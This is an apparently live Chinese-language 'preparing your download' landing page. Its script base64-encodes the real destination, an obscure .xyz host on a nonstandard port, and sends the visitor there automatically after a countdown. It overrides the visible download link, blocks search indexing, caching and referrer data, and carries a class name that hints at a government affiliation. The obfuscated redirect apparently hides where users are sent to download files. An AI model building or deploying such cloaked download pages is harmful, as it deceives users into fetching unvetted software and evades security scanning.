<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="robots" content="noindex,nofollow,noarchive,nosnippet">
<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet">
<meta name="referrer" content="no-referrer">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<link rel="canonical" href="https://jqjl.cn/">
<title>正在准备下载资源</title>
<link rel="icon" href="/favicon.ico" sizes="any">
<link rel="stylesheet" href="/assets/css/style.css">
</head>
<body class="transfer-page">
  <main class="transfer-shell">
    <section class="transfer-card kexue-jqjl-govcn" aria-live="polite">
      <div class="transfer-mark"></div>
      <h1>正在准备下载资源</h1>
      <p>正在校验连接环境，即将进入下载页面。</p>
      <div class="progress-wrap" aria-hidden="true"><span id="progressBar"></span></div>
      <p class="countdown"><span id="countdown">3</span> 秒后自动继续</p>
      <a class="btn primary" id="manualDownload" href="/kexue.html" rel="nofollow noopener noreferrer">立即下载</a>
      <p class="muted">如未自动跳转，请点击继续。</p>
    </section>
  </main>
  <script>
  const REAL_DOWNLOAD_URL = atob("aHR0cHM6Ly9jYWsuMzEzNDg2Lnh5ejozNTg4OC8=");

  document.addEventListener("DOMContentLoaded", function () {
    const manualDownload = document.getElementById("manualDownload");
    const countdown = document.getElementById("countdown");
    const progressBar = document.getElementById("progressBar");
    let seconds = 3;
    progressBar.style.width = "0%";
    const timer = window.setInterval(function () {
      seconds -= 1;
      countdown.textContent = String(Math.max(seconds, 0));
      progressBar.style.width = String((3 - seconds) / 3 * 100) + "%";
      if (seconds <= 0) {
        window.clearInterval(timer);
        window.location.replace(REAL_DOWNLOAD_URL);
      }
    }, 1000);

    manualDownload.addEventListener("click", function(e){
      e.preventDefault();
      window.location.replace(REAL_DOWNLOAD_URL);
    });
  });
  </script>
</body>
</html>
